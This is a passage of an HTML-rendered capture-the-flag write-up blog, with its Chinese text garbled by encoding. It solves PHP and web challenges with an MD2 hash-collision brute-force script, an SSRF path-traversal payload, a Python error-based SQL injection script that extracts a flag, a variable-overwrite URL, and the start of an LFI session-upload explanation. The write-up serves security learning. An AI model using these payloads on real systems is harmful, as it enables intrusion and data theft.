class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="variable">$url</span>[<span class="number">1</span>]=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$a</span>) <span class="keyword">and</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>)&lt;<span class="number">7</span> <span class="keyword">and</span> <span class="variable">$a</span>!=<span class="number">0</span> <span class="keyword">and</span> <span class="variable">$a</span>**<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$d</span> = (<span class="variable">$b</span>==<span class="title function_ invoke__">hash</span>(<span class="string">&quot;md2&quot;</span>, <span class="variable">$b</span>)) &amp;&amp; (<span class="variable">$c</span>==<span class="title function_ invoke__">hash</span>(<span class="string">&quot;md2&quot;</span>,<span class="title function_ invoke__">hash</span>(<span class="string">&quot;md2&quot;</span>, <span class="variable">$c</span>)));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$d</span>)&#123;</span><br><span class="line">             <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;hint.php&#x27;</span>);</span><br><span class="line">             <span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span>(<span class="variable">$url</span>[<span class="number">1</span>],FILTER_VALIDATE_URL))&#123;</span><br><span class="line">                <span class="variable">$host</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>[<span class="number">1</span>]);</span><br><span class="line">                <span class="title function_ invoke__">print_r</span>(<span class="variable">$host</span>); </span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow\.com$/&#x27;</span>,<span class="variable">$host</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">                    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>[<span class="number">1</span>]));</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;å·®ç‚¹ç‚¹å°±æˆåŠŸäº†ï¼&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;please give me url!!!&#x27;</span>;</span><br><span class="line">            &#125;     </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;æƒ³ä¸€æƒ³md5ç¢°æ’åŸç†å§?!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ç¬¬ä¸€ä¸ªéƒ½è¿‡ä¸äº†è¿˜æƒ³è¦flagå‘€?!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">ç¬¬ä¸€ä¸ªéƒ½è¿‡ä¸äº†è¿˜æƒ³è¦flagå‘€?!</span><br></pre></td></tr></table></figure>

<p>è®¿é—®hintã€</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Is it particularly difficult to break MD2?!</span><br><span class="line">I&#x27;ll tell you quietly that I saw the payoad of the author.</span><br><span class="line">But the numbers are not clear.have fun~~~~</span><br><span class="line">xxxxx024452    hash(&quot;md2&quot;,$b)</span><br><span class="line">xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))</span><br></pre></td></tr></table></figure>

<p>çœ‹æ ·å­æ˜¯ä¸ªçˆ†ç ´</p>
<p>ç¬¬ä¸€å…³</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$a</span>) <span class="keyword">and</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>)&lt;<span class="number">7</span> <span class="keyword">and</span> <span class="variable">$a</span>!=<span class="number">0</span> <span class="keyword">and</span> <span class="variable">$a</span>**<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br></pre></td></tr></table></figure>

<p>phpå°æ•°ç‚¹åè¶…è¿‡161ä½åšå¹³æ–¹è¿ç®—æ—¶ä¼šè¢«æˆªæ–­,æˆ‘ä»¬å¯ä»¥ç”¨ç§‘å­¦è®¡æ•°æ³•æ¥ä»£æ›¿ï¼Œå³ <code>1e-162</code></p>
<p>ç¬¬äºŒå…³</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">100</span>;<span class="variable">$i</span>&lt;=<span class="number">999</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$b</span> = <span class="string">&quot;0e&quot;</span>.<span class="variable">$i</span>.<span class="string">&quot;024452&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>==<span class="title function_ invoke__">hash</span>(<span class="string">&quot;md2&quot;</span>, <span class="variable">$b</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//b=0e652024452</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1000</span>;<span class="variable">$i</span>&lt;=<span class="number">9999</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="string">&quot;0e&quot;</span>.<span class="variable">$i</span>.<span class="string">&quot;48399&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$c</span>==<span class="title function_ invoke__">hash</span>(<span class="string">&quot;md2&quot;</span>,<span class="title function_ invoke__">hash</span>(<span class="string">&quot;md2&quot;</span>, <span class="variable">$c</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//c=0e603448399</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240720145353847.png" alt="image-20240720145353847"></p>
<p>ç¬¬ä¸‰å…³ postä¼ å‚url</p>
<p>file_get_contentsä½¿ç”¨ä¸å­˜åœ¨çš„åè®®åå¯¼è‡´ç›®å½•ç©¿è¶Šï¼Œå®ç°SSRFphpæºç ä¸­ï¼Œåœ¨å‘ç›®æ ‡è¯·æ±‚æ—¶å…ˆä¼šåˆ¤æ–­ä½¿ç”¨çš„åè®®ã€‚å¦‚æœåè®®æ— æ³•è¯†åˆ«ï¼Œå°±ä¼šè®¤ä¸ºå®ƒæ˜¯ä¸ªç›®å½•ã€‚é¢˜ç›®ä¸­è¦æ±‚urlä¸­å­˜åœ¨ ctfshow.com,åˆè¦æ„é€ ç¬¦åˆurlæ ¼å¼</p>
<p>æˆ‘ä»¬è¿™è¾¹éšä¾¿æ¥ä¸€ä¸ªyiyiåè®®ï¼Œåˆå› ä¸º</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow\.com$/&#x27;</span>,<span class="variable">$host</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">                    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>[<span class="number">1</span>]));</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥å¯ä»¥æ„é€ å¦‚ä¸‹payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=yiyi://ctfshow.com/../../../../../../fl0g.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240720145905683.png" alt="image-20240720145905683"></p>
<h2 id="NISACTF-2022-join-us"><a href="#NISACTF-2022-join-us" class="headerlink" title="[NISACTF 2022]join-us"></a>[NISACTF 2022]join-us</h2><p>fuzz</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721125727165.png" alt="image-20240721125727165"></p>
<p>å°è¯•æŠ¥é”™æ³¨å…¥ï¼Œandè¢«è¿‡æ»¤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and extractvalue(1,concat(0x7e,(select user()),0x7e))#</span><br></pre></td></tr></table></figure>

<p>ç”¨||ä»£æ›¿and</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;||extractvalue(1,concat(0x7e,(select user()),0x7e))#</span><br></pre></td></tr></table></figure>

<p>å›æ˜¾</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~root@localhost~&#x27;</span><br></pre></td></tr></table></figure>

<p>å°±å¯ä»¥ç¼–å†™è„šæœ¬äº†ï¼Œå‡ ä¸ªç‚¹ï¼Œandè¿‡æ»¤ç”¨<code>||</code>ä»£æ›¿ï¼Œcolumnsç¦ç”¨ï¼Œä½¿ç”¨joinåšåˆå¹¶ï¼Œmidæˆªå–é•¿åº¦é™åˆ¶</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node5.anna.nssctf.cn:21164/dl.php&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">url</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;tt&#x27;</span>:<span class="string">&quot;1&#x27;||extractvalue(1,concat(0x7e,(select user()),0x7e))#&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    re = requests.post(url,data=data)</span><br><span class="line">    <span class="built_in">print</span>(re.text)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">database</span>(<span class="params">url</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;tt&#x27;</span>:<span class="string">&quot;1&#x27; || (select * from a)#&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    re = requests.post(url,data=data)</span><br><span class="line">    <span class="built_in">print</span>(re.text)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table</span>(<span class="params">url</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;tt&#x27;</span>:<span class="string">&quot;-1&#x27; || extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema like &#x27;sqlsql&#x27;)))#&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    re = requests.post(url,data=data)</span><br><span class="line">    <span class="built_in">print</span>(re.text)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column1</span>(<span class="params">url</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;tt&#x27;</span>:<span class="string">&quot;-1&#x27; || extractvalue(1,concat(0x5c,(select * from (select*from Fal_flag a join Fal_flag b)c)))#&quot;</span><span class="comment">#id</span></span><br><span class="line">    &#125;</span><br><span class="line">    re = requests.post(url,data=data)</span><br><span class="line">    <span class="built_in">print</span>(re.text)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column2</span>(<span class="params">url</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;tt&#x27;</span>:<span class="string">&quot;-1&#x27; || extractvalue(1,concat(0x5c,(select * from (select*from Fal_flag a join output b)c)))#&quot;</span><span class="comment">#data</span></span><br><span class="line">    &#125;</span><br><span class="line">    re = requests.post(url,data=data)</span><br><span class="line">    <span class="built_in">print</span>(re.text)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag1</span>(<span class="params">url</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;tt&#x27;</span>:<span class="string">&quot;-1&#x27; || extractvalue(1,mid(concat(0x5c,(select data from output)),30,20))#&quot;</span><span class="comment">#data</span></span><br><span class="line">    &#125;</span><br><span class="line">    re = requests.post(url,data=data)</span><br><span class="line">    <span class="built_in">print</span>(re.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># test(url)</span></span><br><span class="line">    <span class="comment"># database(url)</span></span><br><span class="line">    <span class="comment"># table(url)</span></span><br><span class="line">    <span class="comment"># column1(url)</span></span><br><span class="line">    <span class="comment"># column2(url)</span></span><br><span class="line">    flag1(url)</span><br><span class="line">    <span class="comment"># NSSCTF&#123;68f27707-1003-413e-bd2a-4f5193963b20&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="MoeCTF-2022-ezphp"><a href="#MoeCTF-2022-ezphp" class="headerlink" title="[MoeCTF 2022]ezphp"></a>[MoeCTF 2022]ezphp</h2><p>å˜é‡è¦†ç›–</p>
<p>æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;source.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;xxxxxxxx&#x27;</span>;</span><br><span class="line"><span class="variable">$giveme</span> = <span class="string">&#x27;can can need flag!&#x27;</span>;</span><br><span class="line"><span class="variable">$getout</span> = <span class="string">&#x27;No! flag.Try again. Come on!&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$giveme</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$getout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;the flag is : &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç›´æ¥æ‰“</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://node5.anna.nssctf.cn:26770/?a=flag&amp;flag=a</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721133554786.png" alt="image-20240721133554786"></p>
<h2 id="ç¬¬äº”ç©ºé—´-2021-EasyCleanup"><a href="#ç¬¬äº”ç©ºé—´-2021-EasyCleanup" class="headerlink" title="[ç¬¬äº”ç©ºé—´ 2021]EasyCleanup"></a>[ç¬¬äº”ç©ºé—´ 2021]EasyCleanup</h2><p>æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(__file__); </span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&quot;eval&quot;</span>)&#123; </span><br><span class="line">    <span class="variable">$shell</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>] : <span class="string">&#x27;phpinfo();&#x27;</span>; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$shell</span>) &gt; <span class="number">15</span> | <span class="title function_ invoke__">filter</span>(<span class="variable">$shell</span>) | <span class="title function_ invoke__">checkNums</span>(<span class="variable">$shell</span>)) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>); </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$shell</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &gt; <span class="number">15</span> | <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>); </span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$banned</span> = [<span class="string">&quot;while&quot;</span>, <span class="string">&quot;for&quot;</span>, <span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;include&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;`&quot;</span>]; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$banned</span> <span class="keyword">as</span> <span class="variable">$ban</span>)&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$var</span>, <span class="variable">$ban</span>)) <span class="keyword">return</span> True; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> False; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNums</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$alphanum</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>; </span><br><span class="line">    <span class="variable">$cnt</span> = <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$alphanum</span>); <span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$var</span>); <span class="variable">$j</span>++)&#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$var</span>[<span class="variable">$j</span>] == <span class="variable">$alphanum</span>[<span class="variable">$i</span>])&#123; </span><br><span class="line">                <span class="variable">$cnt</span> += <span class="number">1</span>; </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$cnt</span> &gt; <span class="number">8</span>) <span class="keyword">return</span> True; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> False; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å½“ mode&#x3D;eval æ—¶ï¼Œè‹¥ shell æ— å€¼ï¼Œåˆ™æ‰§è¡Œphpinfo();ï¼Œè‹¥æœ‰å€¼åˆ™ç»è¿‡æ»¤åæ‰§è¡Œshellå€¼çš„ä»£ç ï¼›fileæœ‰å€¼æ—¶ç»è¿‡æ»¤åè¿›è¡Œæ–‡ä»¶åŒ…å«ã€‚æ‰€ä»¥æ”»å‡»ç‚¹æœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯å˜é‡ shell çš„ RCE ï¼Œä¸€ä¸ªæ˜¯ file çš„æ–‡ä»¶åŒ…å«ï¼Œç”±äº shell å˜é‡éœ€è¦ç»è¿‡<code>if(strlen($shell) &gt; 15 | filter($shell) | checkNums($shell)) exit(&quot;hacker&quot;); </code>ï¼Œé™åˆ¶å¤ªå¤šï¼Œæƒ³è¦é€šè¿‡ RCE å¾—åˆ° flag å‡ ä¹æ— ä»ä¸‹æ‰‹</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721134646129.png" alt="image-20240721134646129"></p>
<p>äºæ˜¯æˆ‘ä»¬è€ƒè™‘ä»fileå¯»æ‰¾æ”»å‡»ç‚¹ã€‚PHP LFIæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ä¸»è¦æ˜¯åŒ…å«æœ¬åœ°æœåŠ¡å™¨ä¸Šå­˜å‚¨çš„ä¸€äº›æ–‡ä»¶ï¼Œä¾‹å¦‚ session æ–‡ä»¶ã€æ—¥å¿—æ–‡ä»¶ã€ä¸´æ—¶æ–‡ä»¶ç­‰ã€‚ä½†æ˜¯ï¼Œåªæœ‰æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶åŒ…å«çš„æ–‡ä»¶å­˜å‚¨æˆ‘ä»¬çš„æ¶æ„ä»£ç æ‰èƒ½æ‹¿åˆ°æœåŠ¡å™¨æƒé™ã€‚å‡å¦‚åœ¨æœåŠ¡å™¨ä¸Šæ‰¾ä¸åˆ°æˆ‘ä»¬å¯ä»¥åŒ…å«çš„æ–‡ä»¶ï¼Œé‚£è¯¥æ€ä¹ˆåŠï¼Ÿæ­¤æ—¶å¯ä»¥é€šè¿‡åˆ©ç”¨ä¸€äº›æŠ€å·§è®©æœåŠ¡å­˜å‚¨æˆ‘ä»¬æ¶æ„ç”Ÿæˆçš„æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«æˆ‘ä»¬æ„é€ çš„çš„æ¶æ„ä»£ç ï¼Œæ­¤æ—¶æœåŠ¡å™¨å°±å­˜åœ¨æˆ‘ä»¬å¯ä»¥åŒ…å«çš„æ–‡ä»¶äº†ã€‚é¦–å…ˆçœ‹åˆ©ç”¨æœ€æ–¹ä¾¿çš„æ—¥å¿—æ–‡ä»¶åŒ…å«ï¼Œæ—¥å¿—æ–‡ä»¶ç›®å½•è·¯å¾„ä¸€èˆ¬è¿‡é•¿ï¼Œä¼šè¢«è¿‡æ»¤æ‰è€Œæ— æ³•åŒ…å«ã€‚ç„¶åå°è¯•ç”¨sessionæ–‡ä»¶åŒ…å«ï¼Œä¸€èˆ¬åˆ©ç”¨GETä¼ å‚å°†æˆ‘ä»¬æ„é€ å¥½çš„æ¶æ„ä»£ç ä¼ å…¥sessionä¸­çš„ï¼Œä½†æ²¡æœ‰ GET ä¼ å‚è¿˜èƒ½å¾€ session ä¸­å†™å…¥ä»£ç å—ï¼Ÿå½“ç„¶å¯ä»¥ï¼Œphp 5.4åæ·»åŠ äº† session.upload_progress åŠŸèƒ½ï¼Œè¿™ä¸ªåŠŸèƒ½å¼€å¯æ„å‘³ç€å½“æµè§ˆå™¨å‘æœåŠ¡å™¨ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œphpå°†ä¼šæŠŠæ­¤æ¬¡æ–‡ä»¶ä¸Šä¼ çš„è¯¦ç»†ä¿¡æ¯(å¦‚ä¸Šä¼ æ—¶é—´ã€ä¸Šä¼ è¿›åº¦ç­‰)å­˜å‚¨åœ¨sessionå½“ä¸­ï¼Œåˆ©ç”¨è¿™ä¸ªç‰¹æ€§å¯ä»¥å°†æ¶æ„è¯­å¥å†™å…¥sessionæ–‡ä»¶ã€‚</p>
